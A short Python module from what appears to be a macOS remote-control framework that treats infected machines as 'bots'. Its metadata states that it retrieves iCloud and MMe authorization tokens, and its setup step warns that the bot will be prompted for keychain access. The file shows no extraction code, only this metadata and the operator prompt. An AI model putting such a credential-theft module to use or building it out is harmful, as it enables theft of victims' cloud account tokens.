# -*- coding: utf-8 -*-
__author__ = "Team Blue"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve iCloud and MMe authorization tokens.",
            "References": [
                "https://github.com/manwhoami/MMeTokenDecrypt"
            ],
            "Stoppable": False
        }

    def setup(self, set_options):
        should_continue = self._view.should_continue([
            "This will prompt the bot to allow keychain access."
        ])

        if should_continue:
            return True, None
        else:
            return False, None
